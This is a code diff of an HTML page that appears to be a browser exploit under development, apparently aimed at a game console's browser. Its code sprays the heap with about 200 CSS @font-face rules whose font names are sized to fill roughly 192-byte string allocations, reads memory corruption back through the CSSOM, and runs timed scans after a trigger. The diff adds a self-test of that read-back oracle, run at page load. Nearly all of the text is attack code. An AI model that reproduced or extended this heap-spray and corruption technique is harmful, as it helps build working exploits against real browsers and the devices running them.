@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v12</title>
+<title>P2 v13</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
 <style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
 <style id="spraycss"></style>
@@ -17,7 +17,7 @@
 // ~192B font-family names; corruption readable back via the CSSOM.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v12 (CSS spray + sanity control)');
+log('PAGE VERSION: v13 (CSS spray + sanity control)');
 log('UA = ' + navigator.userAgent);
 
 var NRULES = 200, NAMELEN = 176;      // StringImpl hdr ~16 + 176 chars ~= 192B
@@ -35,7 +35,7 @@ function cssSpray() {
   var css = '';
   for (var r = 0; r < NRULES; r++) {
     names[r] = makeName(r);
-    css += '@font-face{font-family:' + names[r] + ';src:local(NoFont);}';
+    css += '@font-face{font-family:"' + names[r] + '";src:local(NoFont);}';
   }
   document.getElementById('spraycss').textContent = css;
 }
@@ -104,6 +104,17 @@ function trigger() {
     setTimeout(function () { scanCss('6s'); }, 6000);
   }, 3000);
 }
+
+// ORACLE SELF-TEST at load - never spend a console run on a broken oracle
+cssSpray();
+(function () {
+  try {
+    var r0 = document.getElementById('spraycss').sheet.cssRules[0];
+    var t = r0 ? r0.cssText : '(no rule)';
+    log('oracle self-test: ' + (t.indexOf(names[0]) !== -1 ? 'PASS' : 'FAIL') +
+        ' cssText[0]=' + t.slice(0, 90));
+  } catch (e) { log('oracle self-test threw: ' + e); }
+})();
 
 log('armed');
 window.onload = trigger;
